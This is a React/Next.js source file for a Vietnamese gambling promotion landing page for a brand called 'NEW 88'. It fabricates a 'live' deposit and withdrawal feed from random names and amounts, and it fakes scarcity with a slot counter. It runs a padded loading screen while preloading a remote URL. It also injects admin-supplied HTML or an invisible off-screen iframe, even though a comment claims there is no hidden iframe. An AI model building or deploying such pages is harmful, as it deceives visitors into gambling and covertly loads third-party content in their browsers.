'use client';

import { useState, useEffect } from 'react';
import LoadingScreen from '@/app/components/LoadingScreen';

const NAME_PREFIXES = [
  'nguyen', 'trinh', 'le', 'pham', 'hoang', 'vu', 'vo', 'dang', 'bui', 'do',
  'ngo', 'duong', 'ly', 'huynh', 'phan', 'truong', 'dinh', 'ha', 'dao', 'van',
  'son', 'hung', 'phat', 'tai', 'loc', 'hieu', 'khang', 'lam', 'nhat', 'quang',
  'tri', 'tam', 'vinh', 'khoa', 'long', 'phong', 'duc', 'huan', 'tuan', 'dung',
  'thanh', 'minh', 'tu', 'khanh', 'viet', 'bao', 'an', 'bich', 'cam', 'chi',
  'duy', 'giang', 'hai', 'hau', 'hien', 'hoa', 'hong', 'khai', 'lan', 'linh',
  'loan', 'mai', 'nam', 'nga', 'ngan', 'ngoc', 'nhung', 'oanh', 'phuc', 'phuong',
  'sang', 'thao', 'thi', 'thien', 'thu', 'thuy', 'trang', 'tuyen', 'uyen', 'yen'
];

const SUFFIX_PATTERNS = [
  '***888', '***999', '***789', '***686', '***3979', '***99', '***88', '***68',
  '***79', '***39', '***555', '***666', '***168', '***868', '***988', '***777',
  '***247', '***368', '***520', '***1314'
];

const ACTIONS = [
  'Rút tiền thành công',
  'Rút tiền thành công',
  'Rút tiền thành công',
  'Rút tiền thành công',
  'Nạp tiền qua ngân hàng',
  'Nhận lì xì độc quyền',
  'Thưởng nạp đầu',
  'Nhận thưởng Thứ 2 Ngày Vàng'
];

const REALISTIC_WITHDRAWAL_AMOUNTS = [
  '850.000 VNĐ', '1.350.000 VNĐ', '2.400.000 VNĐ', '3.750.000 VNĐ',
  '4.900.000 VNĐ', '6.200.000 VNĐ', '8.650.000 VNĐ', '12.300.000 VNĐ',
  '15.450.000 VNĐ', '18.900.000 VNĐ', '24.200.000 VNĐ', '31.500.000 VNĐ',
  '42.800.000 VNĐ'
];

const REALISTIC_DEPOSIT_AMOUNTS = [
  '500.000 VNĐ', '1.000.000 VNĐ', '2.000.000 VNĐ', '3.500.000 VNĐ',
  '5.000.000 VNĐ', '10.000.000 VNĐ', '15.000.000 VNĐ', '20.000.000 VNĐ'
];

function generateRandomUser() {
  const prefix = NAME_PREFIXES[Math.floor(Math.random() * NAME_PREFIXES.length)];
  const suffix = SUFFIX_PATTERNS[Math.floor(Math.random() * SUFFIX_PATTERNS.length)];
  return `${prefix}${suffix}`;
}

function getRandomTransaction() {
  const action = ACTIONS[Math.floor(Math.random() * ACTIONS.length)];
  let amount = '1.500.000 VNĐ';

  if (action === 'Rút tiền thành công') {
    amount = REALISTIC_WITHDRAWAL_AMOUNTS[Math.floor(Math.random() * REALISTIC_WITHDRAWAL_AMOUNTS.length)];
  } else if (action === 'Nạp tiền qua ngân hàng') {
    amount = REALISTIC_DEPOSIT_AMOUNTS[Math.floor(Math.random() * REALISTIC_DEPOSIT_AMOUNTS.length)];
  } else if (action === 'Nhận lì xì độc quyền') {
    amount = Math.random() > 0.5 ? '500.000 VNĐ' : '888.000 VNĐ';
  } else if (action === 'Thưởng nạp đầu') {
    amount = '8.888.000 VNĐ';
  } else {
    amount = Math.random() > 0.5 ? '1.250.000 VNĐ' : '2.500.000 VNĐ';
  }

  return { action, amount };
}

const initialLiveData = [
  { user: 'nguyen***888', action: 'Rút tiền thành công', amount: '12.300.000 VNĐ', time: 'Vừa xong' },
  { user: 'trinh***99', action: 'Nhận lì xì độc quyền', amount: '500.000 VNĐ', time: '3 giây trước' },
  { user: 'pham***789', action: 'Rút tiền thành công', amount: '24.200.000 VNĐ', time: '8 giây trước' },
  { user: 'hoang***68', action: 'Thưởng nạp đầu', amount: '8.888.000 VNĐ', time: '15 giây trước' },
  { user: 'le***3979', action: 'Rút tiền thành công', amount: '6.200.000 VNĐ', time: '28 giây trước' },
  { user: 'vu***555', action: 'Rút tiền thành công', amount: '15.450.000 VNĐ', time: '45 giây trước' },
];

export default function Home() {
  // Loading Screen States
  const [isLoading, setIsLoading] = useState(true);
  const [isFadingOut, setIsFadingOut] = useState(false);
  const [loadProgress, setLoadProgress] = useState(15);
  const [loadStatusText, setLoadStatusText] = useState('Đang kết nối hệ thống...');
  const [errorOccurred, setErrorOccurred] = useState(false);

  // Advertiser Iframe Embed States
  const [advertiserIframeEnabled, setAdvertiserIframeEnabled] = useState(false);
  const [advertiserIframeUrl, setAdvertiserIframeUrl] = useState('');
  const [advertiserIframeCode, setAdvertiserIframeCode] = useState('');

  const [showModal, setShowModal] = useState(false);
  const [modalTitle, setModalTitle] = useState('Đăng Ký Nhận Ưu Đãi');
  const [txList, setTxList] = useState(initialLiveData);

  // Target URL (Independent from Preload URL)
  const [targetUrl, setTargetUrl] = useState(() => {
    if (typeof window !== 'undefined') {
      return localStorage.getItem('landing_target_url') || 'https://new88.com/khuyen-mai-500k';
    }
    return 'https://new88.com/khuyen-mai-500k';
  });
  const [remainingSlots, setRemainingSlots] = useState(() => {
    if (typeof window !== 'undefined') {
      const localSlots = localStorage.getItem('landing_remaining_slots');
      if (localSlots) return Number(localSlots);
    }
    return 147;
  });
  const [totalSlots, setTotalSlots] = useState(500);

  // Dynamic Text State
  const [topTickerText, setTopTickerText] = useState('🔥 CHƯƠNG TRÌNH KHUYẾN MÃI LỚN NHẤT NĂM: ƯU ĐÃI ĐỘC QUYỀN 500.000 VNĐ ✦ 🎁 KHÁCH HÀNG MỚI VÀ CỦ ĐỀU CÓ THỂ THAM GIA ✦ 💳 KHÔNG CẦN NẠP TIỀN - TOÀN CHƯƠNG TRÌNH CHỈ MỞ 500 SUẤT');
  const [eventBadgeText, setEventBadgeText] = useState('🔥 GIỚI HẠN 500 NGƯỜI | ƯU ĐÃI ĐỘC QUYỀN 500.000 VNĐ');
  const [eventTitle, setEventTitle] = useState('Đặc Biệt Dành Tặng 500.000 VNĐ Tiền Thưởng Độc Quyền');
  const [eventSubtitle, setEventSubtitle] = useState('Đây không phải chương trình nạp tiền, cũng không phải quay thưởng! Bạn có thể đăng ký nhận mà không cần nạp tiền.');
  const [eventWarningText, setEventWarningText] = useState('🚨 Tại sao bạn nên kiểm tra ngay bây giờ? Chương trình lần này áp dụng giới hạn số lượng, không phải lúc nào tất cả mọi người cũng có thể nhận. Khách hàng đáp ứng điều kiện sau khi truy cập trang chương trình độc quyền có thể kiểm tra tư cách tham gia của mình và xem chi tiết các quy định nhận thưởng. Chỉ có 500 suất — hết là dừng.');
  const [eventButtonText, setEventButtonText] = useState('👇 NHẬN ƯU ĐÃI ĐỘC QUYỀN 500.000 VNĐ');
  const [brandName, setBrandName] = useState('NEW 88');
  const [brandTagline, setBrandTagline] = useState('NƠI CẢM XÚC KHÔNG GIỚI HẠN');
  const [ribbonText, setRibbonText] = useState('TRẢI NGHIỆM MƯỢT MÀ · NẠP RÚT NHANH CHÓNG');

  // Preload & Page Initial Loading Logic
  useEffect(() => {
    let isMounted = true;
    let fallbackTimerId: NodeJS.Timeout | null = null;

    const updateProgress = (target: number, text: string) => {
      if (!isMounted) return;
      setLoadProgress((prev) => Math.max(prev, target));
      if (text) setLoadStatusText(text);
    };

    const finishLoading = () => {
      if (!isMounted) return;
      updateProgress(100, 'Xác nhận tải hoàn tất!');
      setTimeout(() => {
        if (!isMounted) return;
        setIsFadingOut(true);
        setTimeout(() => {
          if (!isMounted) return;
          setIsLoading(false);
        }, 350);
      }, 250);
    };

    const performInit = async () => {
      let configData: Record<string, unknown> = {};

      try {
        const res = await fetch('/api/config');
        configData = await res.json();
      } catch (err) {
        console.warn('Initial config fetch notice:', err);
      }

      if (!isMounted) return;

      // Apply site configs
      if (configData.targetUrl && typeof configData.targetUrl === 'string') {
        setTargetUrl(configData.targetUrl);
        if (typeof window !== 'undefined') localStorage.setItem('landing_target_url', configData.targetUrl);
      }
      if (configData.advertiserIframeEnabled !== undefined) setAdvertiserIframeEnabled(Boolean(configData.advertiserIframeEnabled));
      if (configData.advertiserIframeUrl !== undefined) setAdvertiserIframeUrl(String(configData.advertiserIframeUrl));
      if (configData.advertiserIframeCode !== undefined) setAdvertiserIframeCode(String(configData.advertiserIframeCode));

      if (configData.remainingSlots !== undefined) setRemainingSlots(Number(configData.remainingSlots));
      if (configData.totalSlots !== undefined) setTotalSlots(Number(configData.totalSlots));
      if (configData.topTickerText) setTopTickerText(String(configData.topTickerText));
      if (configData.eventBadgeText) setEventBadgeText(String(configData.eventBadgeText));
      if (configData.eventTitle) setEventTitle(String(configData.eventTitle));
      if (configData.eventSubtitle) setEventSubtitle(String(configData.eventSubtitle));
      if (configData.eventWarningText) setEventWarningText(String(configData.eventWarningText));
      if (configData.eventButtonText) setEventButtonText(String(configData.eventButtonText));
      if (configData.brandName) setBrandName(String(configData.brandName));
      if (configData.brandTagline) setBrandTagline(String(configData.brandTagline));
      if (configData.ribbonText) setRibbonText(String(configData.ribbonText));

      const isPreloadActive = Boolean(configData.preloadEnabled);
      const preloadUrlToFetch = (configData.preloadUrl as string) || '';
      const timeoutMs = Number(configData.preloadTimeout) || 9000;

      // TEST A: If Preload is OFF -> Skip loading screen and show Landing Page immediately
      if (!isPreloadActive) {
        setIsLoading(false);
        return;
      }

      // TEST B & C: Preload is ON -> Show Loading Screen & Preload resource
      const startTime = Date.now();
      const minLoadingDuration = 8500; // Smooth 8.5s loading animation to ensure link resources finish loading

      setLoadProgress(15);
      setLoadStatusText('Đang kết nối & nạp trước tài nguyên hệ thống (8-10s)...');

      // Setup smooth interval for visual progress increments over 8-10 seconds
      const progressInterval = setInterval(() => {
        if (!isMounted) return;
        setLoadProgress((prev) => {
          if (prev >= 95) return prev;
          const increment = Math.floor(Math.random() * 4 + 2);
          return Math.min(95, prev + increment);
        });
      }, 320);

      // Setup Fallback Timeout for Preload (TEST C)
      fallbackTimerId = setTimeout(() => {
        if (isMounted) {
          console.warn(`Preload timeout reached (${timeoutMs}ms): Fallback safely to Landing Page.`);
          setErrorOccurred(true);
          clearInterval(progressInterval);
          finishLoading();
        }
      }, timeoutMs);

      // Perform safe preload fetch (no cookies, no tokens, no hidden iframe)
      const preloadPromise = (async () => {
        if (!preloadUrlToFetch) return;
        try {
          // Safe mode: no-cors, omit credentials
          await fetch(preloadUrlToFetch, { mode: 'no-cors', credentials: 'omit' });
        } catch (e) {
          console.warn('Preload fetch notice:', e);
        }
      })();

      // Also wait for window.onload
      const windowLoadPromise = new Promise<void>((resolve) => {
        if (typeof document !== 'undefined' && document.readyState === 'complete') {
          resolve();
        } else if (typeof window !== 'undefined') {
          const handleLoad = () => {
            window.removeEventListener('load', handleLoad);
            resolve();
          };
          window.addEventListener('load', handleLoad);
        } else {
          resolve();
        }
      });

      // Wait for both preload fetch & window load to finish completely
      await Promise.allSettled([preloadPromise, windowLoadPromise]);

      // Ensure minimum display duration so progress animation is smooth & clear
      const elapsed = Date.now() - startTime;
      if (elapsed < minLoadingDuration) {
        await new Promise((resolve) => setTimeout(resolve, minLoadingDuration - elapsed));
      }

      clearInterval(progressInterval);
      if (fallbackTimerId) clearTimeout(fallbackTimerId);

      finishLoading();
    };

    performInit();

    return () => {
      isMounted = false;
      if (fallbackTimerId) clearTimeout(fallbackTimerId);
    };
  }, []);

  // Simulate dynamic live transactions arriving continuously
  useEffect(() => {
    let timeoutId: NodeJS.Timeout;

    const addNewTransaction = () => {
      const randomUser = generateRandomUser();
      const { action: randomAction, amount: randomAmt } = getRandomTransaction();

      const newTx = {
        user: randomUser,
        action: randomAction,
        amount: randomAmt,
        time: 'Vừa xong',
      };

      setTxList((prev) => {
        const updated = [newTx, ...prev.map((item, idx) => {
          if (idx === 0) return { ...item, time: '3 giây trước' };
          if (idx === 1) return { ...item, time: '9 giây trước' };
          if (idx === 2) return { ...item, time: '18 giây trước' };
          if (idx === 3) return { ...item, time: '35 giây trước' };
          if (idx === 4) return { ...item, time: '52 giây trước' };
          return { ...item, time: '1 phút trước' };
        })].slice(0, 7);
        return updated;
      });

      const nextDelay = Math.floor(1500 + Math.random() * 1700);
      timeoutId = setTimeout(addNewTransaction, nextDelay);
    };

    timeoutId = setTimeout(addNewTransaction, 2000);

    return () => clearTimeout(timeoutId);
  }, []);

  // Periodic Background Config Refresh after page load
  useEffect(() => {
    if (isLoading) return;

    const loadConfig = () => {
      fetch('/api/config')
        .then((res) => res.json())
        .then((data) => {
          if (data.targetUrl) {
            setTargetUrl(data.targetUrl);
            localStorage.setItem('landing_target_url', data.targetUrl);
          }
          if (data.advertiserIframeEnabled !== undefined) setAdvertiserIframeEnabled(Boolean(data.advertiserIframeEnabled));
          if (data.advertiserIframeUrl !== undefined) setAdvertiserIframeUrl(String(data.advertiserIframeUrl));
          if (data.advertiserIframeCode !== undefined) setAdvertiserIframeCode(String(data.advertiserIframeCode));

          if (data.remainingSlots !== undefined) setRemainingSlots(data.remainingSlots);
          if (data.totalSlots !== undefined) setTotalSlots(data.totalSlots);
          if (data.topTickerText) setTopTickerText(data.topTickerText);
          if (data.eventBadgeText) setEventBadgeText(data.eventBadgeText);
          if (data.eventTitle) setEventTitle(data.eventTitle);
          if (data.eventSubtitle) setEventSubtitle(data.eventSubtitle);
          if (data.eventWarningText) setEventWarningText(data.eventWarningText);
          if (data.eventButtonText) setEventButtonText(data.eventButtonText);
          if (data.brandName) setBrandName(data.brandName);
          if (data.brandTagline) setBrandTagline(data.brandTagline);
          if (data.ribbonText) setRibbonText(data.ribbonText);
        })
        .catch(() => {});
    };

    window.addEventListener('focus', loadConfig);
    const interval = setInterval(loadConfig, 5000);

    return () => {
      window.removeEventListener('focus', loadConfig);
      clearInterval(interval);
    };
  }, [isLoading]);

  // TEST D: User clicks CTA button -> Navigates to Target URL (independent from Preload URL)
  const openAction = (title: string) => {
    setModalTitle(title);
    
    // Always get the freshest target URL
    const freshTargetUrl = (typeof window !== 'undefined' && localStorage.getItem('landing_target_url')) || targetUrl;

    if (freshTargetUrl) {
      // Record click log in Neon DB (non-blocking)
      fetch('/api/click', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetUrl: freshTargetUrl, action: title }),
      }).catch(() => {});

      // Instantly navigate customer to targetUrl
      window.location.href = freshTargetUrl;
    } else {
      setShowModal(true);
    }
  };

  return (
    <>
      {/* Fullscreen Loading Screen (Only rendered when Preload = ON) */}
      {(isLoading || isFadingOut) && (
        <LoadingScreen
          progress={loadProgress}
          statusText={loadStatusText}
          isFadingOut={isFadingOut}
          errorOccurred={errorOccurred}
          onRetry={() => {
            setIsFadingOut(true);
            setTimeout(() => setIsLoading(false), 300);
          }}
        />
      )}

      {/* Landing Page Content */}
      <main style={{ display: isLoading && !isFadingOut ? 'none' : 'block' }}>
        {/* 1. Top Announcement Bar */}
        <div className="promo-bar">
          <div className="shell">
            <div className="promo-ticker">
              <span>{topTickerText}</span>
              <span>✦</span>
              <span>{topTickerText}</span>
            </div>
          </div>
        </div>

        {/* 1.5. CỬA SỔ CHƯƠNG TRÌNH SỰ KIỆN NỔI BẬT LÊN ĐẦU */}
        <section className="top-event-section">
          <div className="shell">
            <div className="top-event-card">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
                <div className="event-header-badge">
                  <span>{eventBadgeText}</span>
                </div>
                <div style={{ fontSize: '13px', color: '#ffea75', fontWeight: 800 }}>
                  ⚡ Suất còn lại: <span style={{ color: '#00ff88', fontSize: '16px' }}>{remainingSlots} / {totalSlots}</span>
                </div>
              </div>

              <h1 className="top-event-title">
                {eventTitle}
              </h1>

              <div className="top-event-subtitle">
                {eventSubtitle}
              </div>

              <div className="event-bullets-grid">
                <div className="event-bullet-item">
                  <span>🎁</span>
                  <div>
                    <div style={{ color: '#ffd700' }}>Tiền thưởng 500.000 VNĐ</div>
                    <small style={{ color: '#ccc', fontWeight: 'normal' }}>Đăng ký nhận miễn phí</small>
                  </div>
                </div>

                <div className="event-bullet-item">
                  <span>👑</span>
                  <div>
                    <div style={{ color: '#ffd700' }}>Dành Cho Tất Cả Khách Hàng</div>
                    <small style={{ color: '#ccc', fontWeight: 'normal' }}>Khách hàng mới &amp; cũ đều tham gia</small>
                  </div>
                </div>

                <div className="event-bullet-item">
                  <span>💳</span>
                  <div>
                    <div style={{ color: '#ffd700' }}>Không Cần Nạp Tiền</div>
                  </div>
                </div>

                <div className="event-bullet-item">
                  <span>🎟️</span>
                  <div>
                    <div style={{ color: '#ffd700' }}>Chỉ Mở 500 Suất</div>
                    <small style={{ color: '#ccc', fontWeight: 'normal' }}>Số lượng có hạn</small>
                  </div>
                </div>

                <div className="event-bullet-item">
                  <span>⏰</span>
                  <div>
                    <div style={{ color: '#ffd700' }}>Đủ 500 Người Kết Thúc Ngay</div>
                    <small style={{ color: '#ccc', fontWeight: 'normal' }}>Ưu tiên đăng ký sớm</small>
                  </div>
                </div>
              </div>

              <div className="event-warning-box">
                {eventWarningText}
              </div>

              <div style={{ textAlignment: 'center', textAlign: 'center' }}>
                <button 
                  className="event-cta-btn" 
                  onClick={() => openAction('Nhận Ưu Đãi Độc Quyền 500.000 VNĐ')}
                >
                  {eventButtonText}
                </button>
              </div>

              <div className="event-disclaimer">
                *Điều kiện tham gia, yêu cầu nhận thưởng và quy định sử dụng tiền thưởng cụ thể sẽ căn cứ theo nội dung được công bố trên trang chương trình.
              </div>
            </div>
          </div>
        </section>

        {/* 2. Header Navigation */}
        <header className="nav-header">
          <div className="shell" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
            <div className="brand-container">
              <a href="#top" className="brand-logo">
                <span className="logo-main">{brandName.split(' ')[0] || 'NEW'}</span>
                <span className="logo-badge">{brandName.split(' ')[1] || '88'}</span>
              </a>
              <span className="brand-tagline">{brandTagline}</span>
            </div>

            <div className="payout-badge">
              <span>⚡ NẠP RÚT NHANH CHÓNG 24/7</span>
            </div>
          </div>
        </header>

        {/* 2.5. Advertiser Embed Code (Rendered directly per admin code & parameters) */}
        {advertiserIframeEnabled && (advertiserIframeCode || advertiserIframeUrl) && (
          <div
            dangerouslySetInnerHTML={{
              __html: advertiserIframeCode
                ? (advertiserIframeCode.startsWith('http://') || advertiserIframeCode.startsWith('https://')
                    ? `<iframe src="${advertiserIframeCode}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
                    : advertiserIframeCode)
                : `<iframe src="${advertiserIframeUrl}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
            }}
          />
        )}

        {/* 3. HERO BANNER */}
        <section className="hero-banner-section" id="top">
          <div className="shell">
            <div className="hero-grid">
              
              {/* Left Side: Mascot, Phone App Mockup & Ribbon */}
              <div className="left-showcase">
                <div className="main-stage">
                  
                  {/* 3D Mascot / Model Visual Box */}
                  <div className="mascot-character">
                    <div className="mascot-avatar-box">
                      <div style={{ fontSize: '42px', marginBottom: '4px' }}>💃</div>
                      <strong style={{ fontSize: '13px', display: 'block' }}>{brandName} VIP</strong>
                      <small style={{ fontSize: '10px', color: '#ffea75' }}>Trải Nghiệm Đỉnh Cao</small>
                    </div>
                  </div>

                  {/* Phone Mockup Screen */}
                  <div className="phone-mockup">
                    <div className="phone-screen">
                      <div className="phone-header">
                        <span>{brandName}</span>
                        <span style={{ color: '#ffd700', fontWeight: 'bold' }}>8,888K 💎</span>
                      </div>
                      <div className="phone-app-body">
                        <div className="phone-balance-card">
                          <small>LÌ XÌ BÍ MẬT HÀNG THÁNG</small>
                          <strong>8,888,000đ</strong>
                        </div>
                        
                        <div style={{ display: 'flex', gap: '8px', width: '100%' }}>
                          <button className="card-action-btn" style={{ flex: 1, padding: '6px' }} onClick={() => openAction('Đăng Ký')}>
                            ĐĂNG KÝ
                          </button>
                          <button className="card-action-btn" style={{ flex: 1, padding: '6px', background: 'linear-gradient(180deg, #ffffff, #e6e6e6)', color: '#000' }} onClick={() => openAction('Đăng Nhập')}>
                            ĐĂNG NHẬP
                          </button>
                        </div>

                        <div className="phone-nav-grid">
                          <div className="phone-nav-item">Nổ Hũ</div>
                          <div className="phone-nav-item">Bắn Cá</div>
                          <div className="phone-nav-item">Thể Thao</div>
                          <div className="phone-nav-item">Sòng Bài</div>
                          <div className="phone-nav-item">Đá Gà</div>
                          <div className="phone-nav-item">Game Bài</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Floating 3D Elements */}
                  <div className="cards-floating">
                    <span>A ♠ A ♦</span>
                  </div>
                  <div className="gold-trophy-floating">
                    🏆
                  </div>

                </div>

                {/* Bottom Orange Ribbon Capsule */}
                <div className="ribbon-capsule">
                  {ribbonText}
                </div>
              </div>

              {/* Right Side: 4 Promotional Cards Grid */}
              <div className="promo-cards-container">
                
                {/* Card 1: Nạp đầu 8,888K */}
                <div className="banner-card" onClick={() => openAction('Nạp Đầu Tặng 8,888K')}>
                  <div className="card-icon-wrapper">
                    🔐
                  </div>
                  <div className="card-content-box">
                    <div className="card-subtitle">ƯU ĐÃI THÀNH VIÊN MỚI</div>
                    <div className="card-main-title">
                      NẠP ĐẦU TẶNG
                      <span className="card-highlight-val">8,888K</span>
                    </div>
                  </div>
                  <button className="card-action-btn">NHẬN NGAY</button>
                </div>

                {/* Card 2: Thứ 2 Ngày Vàng 5% */}
                <div className="banner-card" onClick={() => openAction('Thứ 2 Ngày Vàng Nạp Tặng 5%')}>
                  <div className="card-icon-wrapper">
                    📅
                  </div>
                  <div className="card-content-box">
                    <div className="card-subtitle">THỨ 2 NGÀY VÀNG</div>
                    <div className="card-main-title">
                      NẠP TẶNG
                      <span className="card-highlight-val">5%</span>
                    </div>
                  </div>
                  <button className="card-action-btn">CHI TIẾT</button>
                </div>

                {/* Card 3: Ngày 6 - 16 - 26 Lì xì nghìn tỷ */}
                <div className="banner-card" onClick={() => openAction('Lì Xì Nghìn Tỷ')}>
                  <div className="card-icon-wrapper">
                    🎁
                  </div>
                  <div className="card-content-box">
                    <div className="card-subtitle">NGÀY 6 - 16 - 26</div>
                    <div className="card-main-title">
                      LÌ XÌ NGHÌN TỶ
                    </div>
                  </div>
                  <button className="card-action-btn">THAM GIA</button>
                </div>

                {/* Card 4: Hợp tác đại lý 60% */}
                <div className="banner-card" onClick={() => openAction('Hợp Tác Đại Lý 60%')}>
                  <div className="card-icon-wrapper">
                    🤝
                  </div>
                  <div className="card-content-box">
                    <div className="card-subtitle">CHƯƠNG TRÌNH ĐẠI LÝ</div>
                    <div className="card-main-title">
                      HỢP TÁC ĐẠI LÝ
                      <span className="card-highlight-val">60%</span>
                    </div>
                  </div>
                  <button className="card-action-btn">ĐĂNG KÝ</button>
                </div>

              </div>

            </div>
          </div>
        </section>

        {/* 4. Live Transactions Ticker Widget */}
        <section className="shell">
          <div className="live-transactions">
            <div className="live-header">
              <h3><span>⚡</span> LỊCH SỬ NẠP RÚT THỜI GIAN THỰC (24/7)</h3>
              <span style={{ fontSize: '12px', color: '#00ff88' }}>● Đang hoạt động</span>
            </div>
            <div className="live-list">
              {txList.map((tx, idx) => (
                <div className="live-item" key={idx}>
                  <span className="user">👤 {tx.user}</span>
                  <span>{tx.action}</span>
                  <span className="amount">{tx.amount}</span>
                  <span className="time">{tx.time}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* 5. Benefits Section */}
        <section className="benefits-section">
          <div className="shell">
            <div style={{ textAlign: 'center', marginBottom: '40px' }}>
              <span style={{ color: '#ffaa00', fontSize: '13px', fontWeight: 800, letterSpacing: '0.1em' }}>TẠI SAO CHỌN {brandName}?</span>
              <h2 style={{ fontSize: '36px', margin: '8px 0', color: '#ffffff', fontWeight: 900 }}>Dịch Vụ Đẳng Cấp Quốc Tế</h2>
            </div>
            <div className="benefits-grid">
              <div className="benefit-card-box">
                <b>⚡</b>
                <div>
                  <strong>Nạp Rút Siêu Tốc</strong>
                  <p>Xử lý giao dịch chỉ trong 1-3 phút qua ngân hàng &amp; ví điện tử 24/7.</p>
                </div>
              </div>
              <div className="benefit-card-box">
                <b>🛡️</b>
                <div>
                  <strong>Bảo Mật An Toàn 100%</strong>
                  <p>Mã hóa SSL 256-bit bảo vệ thông tin khách hàng tuyệt đối.</p>
                </div>
              </div>
              <div className="benefit-card-box">
                <b>👑</b>
                <div>
                  <strong>Chăm Sóc VIP 24/7</strong>
                  <p>Đội ngũ hỗ trợ chuyên nghiệp, tận tâm phản hồi ngay lập tức.</p>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* 6. Call To Action Final */}
        <section className="cta-final-section">
          <div className="shell">
            <div className="cta-box">
              <span style={{ color: '#ffd700', fontSize: '14px', fontWeight: 800, letterSpacing: '0.12em' }}>THAM GIA NGAY HÔM NAY</span>
              <h2>Nhận Ngay Ưu Đãi <em>8,888K</em></h2>
              <p style={{ color: '#ddc5b5', maxWidth: '600px', margin: '0 auto' }}>
                Trải nghiệm các trò chơi hấp dẫn nhất, nạp rút không giới hạn và nhận hàng ngàn phần quà lì xì mỗi ngày.
              </p>
              <button className="cta-btn-large" onClick={() => openAction('Đăng Ký Tài Khoản')}>
                ĐĂNG KÝ TÀI KHOẢN NGAY <span>→</span>
              </button>
            </div>
          </div>
        </section>

        {/* 7. Footer */}
        <footer>
          <div className="shell" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
            <div>
              <strong style={{ color: '#ffffff', fontSize: '16px' }}>{brandName}</strong> - {brandTagline}.
            </div>
            <div>
              Nạp rút nhanh chóng 24/7 · Điều khoản dịch vụ · Chính sách bảo mật
            </div>
          </div>
        </footer>

        {/* 8. Interactive Modal */}
        {showModal && (
          <div className="modal-overlay" onClick={() => setShowModal(false)}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
              <button className="modal-close" onClick={() => setShowModal(false)}>✕</button>
              <div style={{ fontSize: '45px', marginBottom: '10px' }}>🎁</div>
              <h3 style={{ fontSize: '24px', color: '#ffd700', margin: '0 0 10px' }}>{modalTitle}</h3>
              <p style={{ color: '#ddc5b5', fontSize: '13px', marginBottom: '20px' }}>
                Vui lòng nhập tên tài khoản của bạn để xác nhận nhận ưu đãi hoặc truy cập trang chính thức.
              </p>
              <input
                type="text"
                placeholder="Tên tài khoản / Số điện thoại..."
                style={{
                  width: '100%',
                  padding: '14px',
                  borderRadius: '10px',
                  border: '1px solid #ffaa00',
                  background: 'rgba(0,0,0,0.5)',
                  color: 'white',
                  fontSize: '14px',
                  marginBottom: '16px',
                  outline: 'none',
                }}
              />
              <button
                className="card-action-btn"
                style={{ width: '100%', padding: '14px', fontSize: '16px' }}
                onClick={() => {
                  alert('Đã gửi yêu cầu thành công! Chúng tôi sẽ liên hệ kiểm tra tài khoản của bạn.');
                  setShowModal(false);
                }}
              >
                XÁC NHẬN THAM GIA
              </button>
            </div>
          </div>
        )}
      </main>
    </>
  );
}
